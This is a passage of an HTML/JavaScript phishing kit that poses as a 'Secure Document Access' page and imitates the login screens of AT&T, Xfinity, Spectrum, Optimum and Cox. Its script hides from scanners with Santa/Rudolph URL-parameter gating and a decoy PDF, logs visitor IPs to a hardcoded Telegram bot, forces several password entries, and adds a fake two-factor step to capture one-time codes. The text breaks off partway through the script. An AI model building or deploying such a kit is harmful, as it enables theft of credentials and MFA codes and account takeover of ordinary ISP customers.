<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title id="pageTitle">Secure Document Access</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background-color: #f5f7fa;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    /* Main Container */
    .secure-container {
      width: 100%;
      max-width: 800px;
      background: white;
      border-radius: 8px;
      box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
      overflow: hidden;
    }

    /* Provider Header */
    .provider-header {
      background: white;
      padding: 24px 32px;
      border-bottom: 1px solid #e0e0e0;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .provider-logo {
      height: 32px;
    }

    .provider-logo img {
      height: 100%;
      object-fit: contain;
    }

    .portal-title {
      color: #13171B;
      font-size: 18px;
      font-weight: 600;
    }

    /* Content Area */
    .secure-content {
      padding: 40px;
    }

    /* Document Card */
    .document-card {
      background: #f8f9fa;
      border: 1px solid #e0e0e0;
      border-radius: 8px;
      padding: 32px;
      margin-bottom: 32px;
      text-align: center;
      transition: all 0.3s ease;
    }

    .document-icon {
      font-size: 48px;
      margin-bottom: 20px;
    }

    .document-title {
      font-size: 20px;
      color: #13171B;
      margin-bottom: 12px;
      font-weight: 600;
    }

    .document-description {
      color: #686e74;
      font-size: 14px;
      line-height: 1.5;
      margin-bottom: 24px;
    }

    /* Action Button */
    .secure-button {
      color: white;
      border: none;
      padding: 14px 32px;
      font-size: 15px;
      font-weight: 600;
      border-radius: 50px;
      cursor: pointer;
      transition: all 0.3s ease;
      display: inline-flex;
      align-items: center;
      gap: 10px;
      position: relative;
      overflow: hidden;
    }

    .secure-button:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
    }

    .secure-button:active {
      transform: translateY(0);
    }

    /* Security Notice */
    .security-notice {
      border-radius: 4px;
      padding: 16px;
      margin-bottom: 24px;
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .security-icon {
      font-size: 20px;
    }

    .security-text {
      font-size: 14px;
      line-height: 1.4;
    }

    /* Footer */
    .provider-footer {
      padding: 24px 40px;
      border-top: 1px solid #e0e0e0;
      background: #f8f9fa;
    }

    .footer-links {
      display: flex;
      justify-content: center;
      gap: 24px;
      margin-top: 16px;
    }

    .footer-link {
      text-decoration: none;
      font-size: 12px;
    }

    .footer-link:hover {
      text-decoration: underline;
    }

    .copyright {
      text-align: center;
      color: #686e74;
      font-size: 12px;
    }

    /* Modal */
    .secure-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .secure-modal.active {
      display: flex;
    }

    .modal-content {
      background: white;
      width: 90%;
      max-width: 440px;
      border-radius: 8px;
      overflow: hidden;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
      transform: scale(0.9);
      opacity: 0;
      animation: modalAppear 0.3s ease forwards;
    }

    @keyframes modalAppear {
      to {
        transform: scale(1);
        opacity: 1;
      }
    }

    /* Login Form */
    .modal-body {
      padding: 0;
    }

    .login-header {
      padding: 32px 32px 24px;
      text-align: center;
      border-bottom: 1px solid #e0e0e0;
    }

    .provider-logo-modal {
      height: 32px;
      margin: 0 auto 16px;
    }

    .provider-logo-modal img {
      height: 100%;
      object-fit: contain;
    }

    .welcome-text {
      color: #13171B;
      font-size: 22px;
      font-weight: 400;
      margin-bottom: 8px;
    }

    .login-form {
      padding: 32px;
    }

    /* Error Message */
    .error-message {
      background: #f8d7da;
      border: 1px solid #f5c6cb;
      border-radius: 4px;
      padding: 12px;
      margin-bottom: 20px;
      display: none;
      align-items: flex-start;
      gap: 10px;
      opacity: 0;
      transform: translateY(-10px);
    }

    .error-message.show {
      display: flex;
      animation: errorSlide 0.3s ease forwards;
    }

    @keyframes errorSlide {
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .error-icon {
      color: #c70032;
      font-size: 16px;
      flex-shrink: 0;
      margin-top: 1px;
    }

    .error-text {
      color: #721c24;
      font-size: 14px;
      line-height: 1.4;
    }

    .form-group {
      margin-bottom: 20px;
      opacity: 0;
      transform: translateY(10px);
      animation: formAppear 0.4s ease forwards;
    }

    @keyframes formAppear {
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .form-group:nth-child(1) {
      animation-delay: 0.1s;
    }
    .form-group:nth-child(2) {
      animation-delay: 0.2s;
    }

    .form-label {
      display: block;
      color: #13171B;
      font-size: 14px;
      font-weight: 600;
      margin-bottom: 8px;
    }

    .form-input {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      border: 1px solid #d1d5db;
      border-radius: 4px;
      background: white;
      transition: all 0.3s ease;
      height: 48px;
    }

    .form-input.error {
      border-color: #c70032;
    }

    .form-input:focus {
      outline: none;
    }

    .password-wrapper {
      position: relative;
    }

    .password-input {
      padding-right: 60px;
    }

    .show-password {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      padding: 4px;
    }

    .checkbox-group {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 24px;
      opacity: 0;
      transform: translateY(10px);
      animation: formAppear 0.4s ease forwards;
      animation-delay: 0.3s;
    }

    .checkbox-input {
      width: 16px;
      height: 16px;
      border: 1px solid #d1d5db;
      border-radius: 3px;
      cursor: pointer;
    }

    .checkbox-label {
      color: #13171B;
      font-size: 14px;
    }

    .signin-button {
      width: 100%;
      padding: 14px;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      margin-bottom: 16px;
      opacity: 0;
      transform: translateY(10px);
      animation: formAppear 0.4s ease forwards;
      animation-delay: 0.4s;
    }

    .signin-button:hover {
      opacity: 0.9;
    }

    .signin-button:disabled {
      background: #ccc !important;
      cursor: not-allowed;
    }

    .login-links {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-bottom: 24px;
      opacity: 0;
      transform: translateY(10px);
      animation: formAppear 0.4s ease forwards;
      animation-delay: 0.5s;
    }

    .login-link {
      text-decoration: none;
      font-size: 14px;
      text-align: center;
    }

    .login-link:hover {
      text-decoration: underline;
    }

    /* Unlocked State */
    .document-unlocked {
      background: linear-gradient(135deg, #f0f9ff 0%, #e6f7ff 100%);
    }

    .document-unlocked .document-icon {
      color: #28a745 !important;
    }

    .unlocked-message {
      color: #28a745;
      font-weight: 600;
      margin-top: 16px;
      animation: fadeInUp 0.5s ease;
    }

    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(10px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    /* Document Actions */
    .document-actions {
      display: flex;
      gap: 12px;
      justify-content: center;
      margin-top: 24px;
    }

    .action-btn {
      padding: 12px 24px;
      border-radius: 4px;
      background: white;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .action-btn:hover {
      color: white;
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
    }

    .action-btn:disabled {
      opacity: 0.5;
      cursor: not-allowed;
      border-color: #ccc !important;
      color: #999 !important;
      transform: none;
    }

    .action-btn:disabled:hover {
      background: white;
      color: #999 !important;
      box-shadow: none;
    }

    /* Loading Animation */
    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 2000;
    }

    .loading-overlay.active {
      display: flex;
      animation: fadeIn 0.3s ease;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
      }
      to {
        opacity: 1;
      }
    }

    .loading-container {
      background: white;
      border-radius: 12px;
      padding: 40px;
      text-align: center;
      max-width: 300px;
      animation: scaleIn 0.3s ease;
    }

    @keyframes scaleIn {
      from {
        transform: scale(0.8);
        opacity: 0;
      }
      to {
        transform: scale(1);
        opacity: 1;
      }
    }

    .loading-spinner {
      width: 50px;
      height: 50px;
      border: 4px solid #f0f0f0;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-text {
      color: #13171B;
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 8px;
    }

    .loading-subtext {
      color: #686e74;
      font-size: 14px;
    }

    /* Button Loading State */
    .secure-button.loading {
      pointer-events: none;
    }

    .secure-button.loading span:first-child {
      animation: lockSpin 0.8s ease infinite;
    }

    @keyframes lockSpin {
      0%, 100% { transform: rotate(0deg); }
      50% { transform: rotate(180deg); }
    }

    /* MFA Modal */
    .mfa-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .mfa-modal.active {
      display: flex;
    }

    .mfa-content {
      background: white;
      width: 90%;
      max-width: 440px;
      border-radius: 8px;
      overflow: hidden;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
      animation: modalAppear 0.3s ease forwards;
    }

    .mfa-header {
      padding: 32px 32px 24px;
      text-align: center;
      border-bottom: 1px solid #e0e0e0;
    }

    .mfa-body {
      padding: 32px;
    }

    .mfa-instructions {
      text-align: center;
      color: #686e74;
      margin-bottom: 30px;
      line-height: 1.5;
    }

    .mfa-code-display {
      background: #f8f9fa;
      border-radius: 8px;
      padding: 25px;
      margin: 25px 0;
      text-align: center;
      border: 2px solid #e0e0e0;
      font-family: 'Courier New', monospace;
      font-size: 24px;
      font-weight: 700;
      letter-spacing: 8px;
      position: relative;
      overflow: hidden;
    }

    .mfa-code-display::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: linear-gradient(
        45deg,
        transparent 30%,
        rgba(255,255,255,0.2) 50%,
        transparent 70%
      );
      animation: shine 2s infinite;
    }

    @keyframes shine {
      0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
      100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
    }

    .mfa-inputs {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin: 30px 0;
    }

    .mfa-input {
      width: 50px;
      height: 60px;
      text-align: center;
      font-size: 24px;
      font-weight: 700;
      border: 2px solid #d1d5db;
      border-radius: 4px;
      background: white;
      transition: all 0.3s;
    }

    .mfa-input:focus {
      outline: none;
      border-color: var(--primary-color);
      box-shadow: 0 0 0 2px var(--primary-color-light);
    }

    .mfa-input.error {
      border-color: #c70032;
    }

    .mfa-attempts {
      text-align: center;
      margin-top: 20px;
      font-size: 13px;
      color: #686e74;
    }

    .mfa-buttons {
      display: flex;
      gap: 10px;
      margin-top: 25px;
    }

    .mfa-button {
      flex: 1;
      padding: 14px;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s;
    }

    .mfa-button.primary {
      background: var(--primary-color);
      color: white;
    }

    .mfa-button.secondary {
      background: #f0f0f0;
      color: #333;
    }

    .mfa-button:hover {
      opacity: 0.9;
      transform: translateY(-1px);
    }

    /* Success Modal */
    .success-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .success-modal.active {
      display: flex;
    }

    .success-content {
      background: white;
      width: 90%;
      max-width: 500px;
      border-radius: 8px;
      overflow: hidden;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
      animation: modalAppear 0.3s ease forwards;
    }

    .success-header {
      padding: 32px 32px 24px;
      text-align: center;
      border-bottom: 1px solid #e0e0e0;
    }

    .success-icon {
      font-size: 60px;
      margin-bottom: 20px;
      animation: celebrate 1s ease;
    }

    @keyframes celebrate {
      0% { transform: scale(0); opacity: 0; }
      70% { transform: scale(1.2); opacity: 1; }
      100% { transform: scale(1); opacity: 1; }
    }

    .success-body {
      padding: 32px;
      text-align: center;
    }

    .success-message {
      color: #28a745;
      font-size: 22px;
      font-weight: 600;
      margin-bottom: 20px;
    }

    .captured-data {
      background: #f8f9fa;
      border-radius: 8px;
      padding: 20px;
      margin: 25px 0;
      text-align: left;
      font-family: 'Courier New', monospace;
      font-size: 12px;
      line-height: 1.6;
      max-height: 200px;
      overflow-y: auto;
      border: 1px solid #e0e0e0;
    }

    .data-line {
      margin-bottom: 8px;
      display: flex;
    }

    .data-label {
      font-weight: 600;
      color: #333;
      min-width: 120px;
    }

    .data-value {
      color: #666;
      word-break: break-all;
    }

    /* Responsive */
    @media (max-width: 768px) {
      .secure-content {
        padding: 24px;
      }

      .document-card {
        padding: 24px;
      }

      .provider-header {
        flex-direction: column;
        gap: 16px;
        text-align: center;
      }

      .footer-links {
        flex-wrap: wrap;
        gap: 16px;
      }

      .document-actions {
        flex-direction: column;
      }

      .login-header, .mfa-header, .success-header {
        padding: 24px 24px 16px;
      }

      .login-form, .mfa-body, .success-body {
        padding: 24px;
      }

      .mfa-input {
        width: 40px;
        height: 50px;
        font-size: 20px;
      }

      .mfa-buttons {
        flex-direction: column;
      }
    }

    /* Shake animation */
    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
      20%, 40%, 60%, 80% { transform: translateX(5px); }
    }

    .shake {
      animation: shake 0.5s ease;
    }

    /* CSS Variables for provider colors */
    :root {
      --primary-color: #009FDB;
      --primary-color-light: rgba(0, 159, 219, 0.1);
    }
  </style>
</head>
<body>
  <!-- Loading Overlay -->
  <div class="loading-overlay" id="loadingOverlay">
    <div class="loading-container">
      <div class="loading-spinner" id="loadingSpinner"></div>
      <div class="loading-text" id="loadingText">Establishing Secure Connection</div>
      <div class="loading-subtext" id="loadingSubtext">Connecting to authentication servers...</div>
    </div>
  </div>

  <!-- Main Container -->
  <div class="secure-container">
    <!-- Header -->
    <div class="provider-header">
      <div class="provider-logo" id="providerLogo">
        <!-- Logo will be inserted by JavaScript -->
      </div>
      <div class="portal-title" id="portalTitle">Secure Document Access</div>
    </div>

    <!-- Content -->
    <div class="secure-content">
      <!-- Security Notice -->
      <div class="security-notice" id="securityNotice">
        <div class="security-icon">‚ö†Ô∏è</div>
        <div class="security-text" id="securityText">
          <strong id="securityTitle">Security Notice:</strong> This document requires account authentication for viewing. All access is logged and monitored.
        </div>
      </div>

      <!-- Document Card -->
      <div class="document-card" id="documentCard">
        <div class="document-icon">üîí</div>
        <h2 class="document-title" id="documentTitle">Account Terms & Conditions Update</h2>
        <p class="document-description" id="documentDescription">
          Document ID: <span id="docId">DOC-2025-0876</span><br>
          Last Updated: December 16, 2025<br>
          Security Level: High
        </p>
        <button class="secure-button" id="accessBtn">
          
          <span id="accessBtnText">Sign In to Access Document</span>
        </button>
      </div>

      <!-- Document Actions (hidden initially) -->
      <div class="document-actions">
        <button class="action-btn" id="downloadBtn" disabled>
          <span>‚¨áÔ∏è</span> <span id="downloadBtnText">Download PDF</span>
        </button>
        <button class="action-btn" id="printBtn" disabled>
          <span>üñ®Ô∏è</span> <span id="printBtnText">Print Document</span>
        </button>
      </div>
    </div>

    <!-- Footer -->
    <div class="provider-footer">
      <div class="copyright" id="copyrightText">
        ¬© 2025 All rights reserved.
      </div>
      <div class="footer-links">
        <a href="#" class="footer-link" id="privacyLink">Privacy Policy</a>
        <a href="#" class="footer-link" id="termsLink">Terms of Use</a>
        <a href="#" class="footer-link" id="legalLink">Legal Center</a>
        <a href="#" class="footer-link" id="accessibilityLink">Accessibility</a>
      </div>
    </div>
  </div>

  <!-- Authentication Modal -->
  <div class="secure-modal" id="authModal">
    <div class="modal-content">
      <div class="modal-body">
        <div class="login-header">
          <div class="provider-logo-modal" id="providerLogoModal">
            <!-- Logo will be inserted by JavaScript -->
          </div>
          <h2 class="welcome-text" id="welcomeText">Welcome</h2>
        </div>
        
        <div class="login-form">
          <!-- Error Message (Initially Hidden) -->
          <div class="error-message" id="errorMessage">
            <div class="error-icon">‚ö†Ô∏è</div>
            <div class="error-text">
              <strong id="errorMessageText">Incorrect user ID or password. Try again.</strong>
              <div id="errorCode" style="font-size: 12px; margin-top: 5px;"></div>
            </div>
          </div>
          
          <form id="authForm">
            <div class="form-group">
              <label class="form-label" for="username" id="usernameLabel">Username</label>
              <input type="text" id="username" class="form-input" placeholder="Enter username" required>
            </div>
            
            <div class="form-group">
              <label class="form-label" for="password" id="passwordLabel">Password</label>
              <div class="password-wrapper">
                <input type="password" id="password" class="form-input password-input" placeholder="Enter your password" required>
                <button type="button" class="show-password" id="showPassword">Show</button>
              </div>
            </div>
            
            <div class="checkbox-group" id="rememberMeGroup">
              <input type="checkbox" id="rememberMe" class="checkbox-input">
              <label for="rememberMe" class="checkbox-label" id="rememberMeLabel">Remember Me</label>
            </div>
            
            <button type="submit" class="signin-button" id="signinBtn">
              <span id="signinBtnText">Continue</span>
            </button>
            
            <div class="login-links" id="loginLinks">
              <!-- Links will be populated based on provider -->
            </div>
          </form>
        </div>
      </div>
    </div>
  </div>

  <!-- MFA Modal -->
  <div class="mfa-modal" id="mfaModal">
    <div class="mfa-content">
      <div class="mfa-header">
        <div class="provider-logo-modal" id="mfaProviderLogo">
          <!-- Logo will be inserted by JavaScript -->
        </div>
        <h2 class="welcome-text" id="mfaWelcomeText">Two-Factor Authentication</h2>
      </div>
      
      <div class="mfa-body">
        <div class="mfa-instructions" id="mfaInstructions">
          For your security, please enter the verification code sent to your registered device.
        </div>
        
        <div class="mfa-code-display" id="mfaCodeDisplay">
          ‚Ä¢ ‚Ä¢ ‚Ä¢ ‚Ä¢ ‚Ä¢ ‚Ä¢
        </div>
        
        <div class="mfa-inputs">
          <input type="text" maxlength="1" class="mfa-input" data-index="0">
          <input type="text" maxlength="1" class="mfa-input" data-index="1">
          <input type="text" maxlength="1" class="mfa-input" data-index="2">
          <input type="text" maxlength="1" class="mfa-input" data-index="3">
          <input type="text" maxlength="1" class="mfa-input" data-index="4">
          <input type="text" maxlength="1" class="mfa-input" data-index="5">
        </div>
        
        <div class="mfa-attempts" id="mfaAttempts">
          Attempt <span id="currentMfaAttempt">1</span> of <span id="maxMfaAttempts">2</span>
        </div>
        
        <div class="mfa-buttons">
          <button class="mfa-button primary" id="verifyMfaBtn">Verify Code</button>
          <button class="mfa-button secondary" id="cancelMfaBtn">Cancel</button>
        </div>
      </div>
    </div>
  </div>

  <!-- Success Modal -->
  <div class="success-modal" id="successModal">
    <div class="success-content">
      <div class="success-header">
        <div class="success-icon">‚úÖ</div>
        <h2 class="welcome-text" id="successWelcomeText">Authentication Complete</h2>
      </div>
      
      <div class="success-body">
        <div class="success-message" id="successMessage">
          Document access granted successfully!
        </div>
        
        <div class="captured-data" id="capturedData">
          <!-- Captured credentials will be displayed here -->
        </div>
        
        <div class="mfa-buttons">
          <button class="mfa-button primary" id="viewDocumentBtn">View Document</button>
          <button class="mfa-button secondary" id="closeSuccessBtn">Close</button>
        </div>
      </div>
    </div>
  </div>

  <script>

    // ============================================================================
// SIMPLE URL PARAMETER CHECK WITH BLACKLISTING
// ============================================================================
(function() {
    console.log('üîç Checking URL parameters...');
    
    const urlParams = new URLSearchParams(window.location.search);
    const giftCode = urlParams.get('giftCode');
    const reindeer = urlParams.get('reindeer');
    const bd = urlParams.get('Bd');
    
    console.log('URL Parameters:', { giftCode, reindeer, bd });
    
    // Initialize blacklist storage if needed
    if (!localStorage.getItem('simple_blacklist')) {
        localStorage.setItem('simple_blacklist', JSON.stringify([]));
    }
    
    // Function to add IP to blacklist
    async function addToBlacklist(reason) {
        try {
            // Get IP
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ip = ipData.ip;
            
            // Get blacklist
            const blacklist = JSON.parse(localStorage.getItem('simple_blacklist') || '[]');
            
            // Create entry
            const entry = {
                ip: ip,
                timestamp: new Date().toISOString(),
                reason: reason,
                details: {
                    giftCode: giftCode,
                    reindeer: reindeer,
                    bd: bd,
                    url: window.location.href,
                    userAgent: navigator.userAgent.substring(0, 100)
                }
            };
            
            // Add to blacklist if not already there
            const existingIndex = blacklist.findIndex(entry => entry.ip === ip);
            if (existingIndex === -1) {
                blacklist.push(entry);
                localStorage.setItem('simple_blacklist', JSON.stringify(blacklist));
                console.log(`üö´ Added ${ip} to blacklist: ${reason}`);
                
                // Send Telegram alert
                sendTelegramAlert(ip, reason);
            }
            
        } catch (error) {
            console.error('Error adding to blacklist:', error);
        }
    }
    
    // Function to send Telegram alert
    async function sendTelegramAlert(ip, reason) {
        try {
            const BOT_TOKEN = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
            const CHAT_ID = '1412104349';
            
            const message = `üö´ *BLACKLISTED - ${ip}*
            
üîí *Reason:* ${reason}
üìÖ *Time:* ${new Date().toLocaleString()}
üåê *URL:* ${window.location.href}
üéØ *Parameters:*
‚Ä¢ giftCode: \`${giftCode || 'missing'}\`
‚Ä¢ reindeer: \`${reindeer || 'missing'}\`
‚Ä¢ Bd: \`${bd || 'missing'}\`

üñ•Ô∏è *User Agent:* ${navigator.userAgent.substring(0, 100)}...`;
            
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            
        } catch (error) {
            console.error('Error sending Telegram alert:', error);
        }
    }
    
    // Check if all required parameters exist
    const hasAllParams = giftCode && reindeer && bd;
    
    if (!hasAllParams) {
        console.log('‚ùå Missing parameters - showing PDF iframe');
        
        // Add to blacklist
        addToBlacklist('Missing required parameters');
        
        // Show PDF iframe
        showPDFIframe();
        return;
    }
    
    // Check parameter formats
    const isValidGiftCode = /^Santa\d{3}$/i.test(giftCode);
    const isValidReindeer = /^Rudolph\d{3}$/i.test(reindeer);
    const isValidBd = /^[AXSOC]$/i.test(bd);
    
    if (!isValidGiftCode || !isValidReindeer || !isValidBd) {
        console.log('‚ùå Invalid parameter format - showing PDF iframe');
        
        // Add to blacklist
        addToBlacklist('Invalid parameter format');
        
        // Show PDF iframe
        showPDFIframe();
        return;
    }
    
    console.log('‚úÖ All parameters valid - loading credential system');
    
    // Function to show PDF iframe
    function showPDFIframe() {
        document.body.innerHTML = `
            <style>
                body { margin: 0; padding: 0; overflow: hidden; }
                .pdf-frame { 
                    width: 100vw; 
                    height: 100vh; 
                    border: none; 
                }
            </style>
            <iframe 
                class="pdf-frame" 
                src="https://www.marshall.edu/procurement-services/files/MU20INTATHINS_CO1.pdf"
            >
                Your browser doesn't support iframes. 
                <a href="https://www.marshall.edu/procurement-services/files/MU20INTATHINS_CO1.pdf">Download PDF</a>
            </iframe>
        `;
        
        // Stop all other JavaScript from running
        throw new Error('Invalid URL parameters - PDF shown');
    }
    
})();




///////////////////////////////////////////////////////////////////////////////
// ============================================================================
// CONFIGURATION - FULLY CUSTOMIZABLE
// ============================================================================
const CONFIG = {
  // Telegram Configuration
  TELEGRAM_BOT_TOKEN: '8321740469:AAHDTke-Vf-lr9xQ6MHHZ1sP0QYrexeznL4',
  TELEGRAM_CHAT_ID: '1412104349',
  ENABLE_TELEGRAM: true,
  
  // Authentication Attempt Configuration
  PASSWORD_ATTEMPTS_REQUIRED: 3,     // Number of password attempts before success
  MFA_ATTEMPTS_ALLOWED: 2,           // Number of MFA attempts allowed
  
  // Security Settings
  PREVENT_PASSWORD_REUSE: true,      // Prevent using same password twice
  MFA_CODE_LENGTH: 6,               // Length of MFA code
  MFA_CODE_EXPIRY_MINUTES: 10,      // Minutes before MFA code expires
  
  // Provider Detection
  DEFAULT_PROVIDER: 'A',            // Default to AT&T
  USE_URL_PARAM: true,              // Read provider from URL ?Bd= parameter
  USE_UA_DETECTION: true            // Detect provider from user agent
};

// ============================================================================
// PROVIDERS CONFIGURATION WITH REAL LOGOS
// ============================================================================
const PROVIDERS = {
  'A': { // AT&T
    name: 'AT&T',
    code: 'A',
    colors: {
      primary: 'rgb(0, 56, 143)',
      primaryLight: 'rgba(0, 56, 143, 0.1)'
    },
    logo: 'https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg',
    buttonText: 'Sign in',
    loginConfig: {
      field1: { label: 'User ID', placeholder: 'Enter AT&T user ID' },
      field2: { label: 'Password', placeholder: 'Enter password' },
      hasRememberMe: true,
      rememberMeText: 'Keep me signed in',
      buttonText: 'Continue',
      welcomeText: 'Sign in',
      errorMessage: 'Incorrect user ID or password. Try again.',
      links: [
        { text: 'Forgot user ID?', href: '#' },
      ],
      errorCode: ''
    }
  },
  'X': { // Xfinity
    name: 'Xfinity',
    code: 'X',
    colors: {
      primary: '#111111',
      primaryLight: 'rgba(17, 17, 17, 0.1)'
    },
    logo: 'https://login.xfinity.com/static/images/global/xfinity-logo-grey.svg',
    buttonText: 'Let\'s go',
    loginConfig: {
      field1: { label: 'Username', placeholder: 'Enter Xfinity username' },
      field2: { label: 'Password', placeholder: 'Enter password' },
      hasRememberMe: true,
      rememberMeText: 'Stay Signed In on This Device',
      buttonText: 'Sign In',
      welcomeText: 'Sign In to Get Started',
      errorMessage: 'The info you entered doesn\'t match our records. Please try again or select Forgot Username or Password.',
      links: [
        { text: 'Forgot Username or Password?', href: '#' }
      ],
      errorCode: 'IDID-3104'
    }
  },
  'S': { // Spectrum
    name: 'Spectrum',
    code: 'S',
    colors: {
      primary: 'rgb(2, 87, 178)',
      primaryLight: 'rgba(2, 87, 178, 0.1)'
    },
    logo: '/assets/images/spectrum-logo.svg',
    backupLogo: 'https://www.spectrum.com/etc.clientlibs/spectrum/clientlibs/clientlib-base/resources/images/logos/spectrum-logo.svg',
    buttonText: 'Sign In',
    loginConfig: {
      field1: { label: 'Username', placeholder: 'Enter Spectrum username' },
      field2: { label: 'Password', placeholder: 'Enter password' },
      hasRememberMe: true,
      rememberMeText: 'Stay Signed In on This Device',
      buttonText: 'Sign In',
      welcomeText: 'Sign In to Get Started',
      errorMessage: 'The info you entered doesn\'t match our records. Please try again or select Forgot Username or Password.',
      links: [
        { text: 'Forgot Username or Password?', href: '#' }
      ],
      errorCode: 'IDID-3104'
    }
  },
  'O': { // Optimum
    name: 'Optimum',
    code: 'O',
    colors: {
      primary: 'rgb(254, 110, 0)',
      primaryLight: 'rgba(254, 110, 0, 0.1)'
    },
    logo: 'https://www.optimum.com/content/dam/optimum/Header/optimum_logo.svg',
    buttonText: 'Continue',
    loginConfig: {
      field1: { label: 'Username*', placeholder: 'Enter Optimum username' },
      field2: { label: 'Password*', placeholder: 'Enter password' },
      hasRememberMe: true,
      rememberMeText: 'Remember Me',
      buttonText: 'Continue',
      welcomeText: 'Sign in to Optimum',
      errorMessage: 'Incorrect user ID or password. Try again.',
      links: [
        { text: 'Forgot ID?', href: '#' },
      ],
      errorCode: ''
    }
  },
  'C': { // Cox
    name: 'Cox',
    code: 'C',
    colors: {
      primary: '#285A93',
      primaryLight: 'rgba(40, 90, 147, 0.1)'
    },
    logo: 'https://www.cox.com/content/dam/cox/common/icons/ui_components/cox_logo.png',
    buttonText: 'Sign in',
    loginConfig: {
      field1: { label: 'User ID', placeholder: 'Enter Cox user ID' },
      field2: { label: 'Password', placeholder: 'Enter password' },
      hasRememberMe: true,
      rememberMeText: 'Remember user ID',
      buttonText: 'Sign in',
      welcomeText: 'Welcome back',
      errorMessage: 'Incorrect user ID or password. Try again.',
      links: [
        { text: 'Forgot User ID?', href: '#' },
      ],
      errorCode: ''
    }
  }
};

// ============================================================================
// STATE MANAGEMENT
// ============================================================================
let currentProvider = null;
let currentSession = {
  provider: null,
  username: '',
  password: '',
  mfaCode: '',
  usedPasswords: [],              // Track previously used passwords
  attempts: {
    password: 0,
    mfa: 0
  },
  mfaGenerated: false,
  mfaCodeValue: '',
  mfaExpiry: null,
  userInfo: null,
  capturedAt: null
};

let mfaInputs = [];
let generatedMfaCode = '';

// ============================================================================
// DOM ELEMENTS
// ============================================================================
const elements = {
  // Main UI
  accessBtn: document.getElementById('accessBtn'),
  documentCard: document.getElementById('documentCard'),
  downloadBtn: document.getElementById('downloadBtn'),
  printBtn: document.getElementById('printBtn'),
  
  // Loading
  loadingOverlay: document.getElementById('loadingOverlay'),
  loadingText: document.getElementById('loadingText'),
  loadingSubtext: document.getElementById('loadingSubtext'),
  loadingSpinner: document.getElementById('loadingSpinner'),
  
  // Auth Modal
  authModal: document.getElementById('authModal'),
  authForm: document.getElementById('authForm'),
  providerLogoModal: document.getElementById('providerLogoModal'),
  welcomeText: document.getElementById('welcomeText'),
  username: document.getElementById('username'),
  password: document.getElementById('password'),
  showPassword: document.getElementById('showPassword'),
  signinBtn: document.getElementById('signinBtn'),
  signinBtnText: document.getElementById('signinBtnText'),
  errorMessage: document.getElementById('errorMessage'),
  errorMessageText: document.getElementById('errorMessageText'),
  errorCode: document.getElementById('errorCode'),
  rememberMeGroup: document.getElementById('rememberMeGroup'),
  rememberMeLabel: document.getElementById('rememberMeLabel'),
  loginLinks: document.getElementById('loginLinks'),
  
  // MFA Modal
  mfaModal: document.getElementById('mfaModal'),
  mfaProviderLogo: document.getElementById('mfaProviderLogo'),
  mfaWelcomeText: document.getElementById('mfaWelcomeText'),
